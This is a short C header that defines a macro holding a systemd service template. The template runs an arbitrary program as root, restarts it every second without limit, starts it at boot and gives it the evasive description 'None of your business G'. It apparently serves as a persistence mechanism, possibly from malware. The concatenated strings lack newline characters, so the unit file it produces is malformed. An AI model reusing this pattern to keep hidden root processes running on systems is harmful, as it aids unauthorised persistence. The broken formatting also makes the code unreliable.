#ifndef SHIELD_H
#define SHIELD_H

#define SYSTEMD_CONFIG "[Unit]" \
"Description=None of your business G" \
"After=network.target" \
"StartLimitIntervalSec=0" \
 \
"[Service]" \
"Type=simple" \
"Restart=always" \
"RestartSec=1" \
"User=root" \
"ExecStart=%s" \
\
"[Install]" \
"WantedBy=multi-user.target"

#endif
